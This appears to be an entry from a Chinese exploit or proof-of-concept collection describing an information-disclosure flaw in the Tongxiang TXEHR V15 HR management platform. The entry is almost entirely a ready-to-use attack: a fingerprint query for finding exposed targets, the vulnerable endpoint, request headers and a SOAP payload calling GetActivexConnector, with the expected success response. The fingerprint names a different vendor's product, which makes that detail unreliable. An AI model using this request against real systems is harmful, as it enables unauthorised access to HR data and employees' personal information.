# 同享TXEHRV15人力管理管理平台GetActivexConnector信息泄露漏洞

- **系统**：同享TXEHRV15人力管理管理平台GetActivexConnector　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`app="万户网络-ezEIP"`
- **请求**：`POST /Service/ActiveXConnector.asmx HTTP/1.1`
- **关键头**：`Cookie: ASP.NET_SessionId=f40br0ilcoosnxgllqrmltkd`　`Priority: u=1`　`SOAPAction: [http://tempuri.org/GetActivexConnector](http://tempuri.org/GetActivexConnector)`　`Content-Type: text/xml;charset=UTF-8`　`Content-Length: 224`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
<soapenv:Header/>
<soapenv:Body>
<tem:GetActivexConnector/>
</soapenv:Body>
</soapenv:Envelope>
```
- **预期**：200　|　—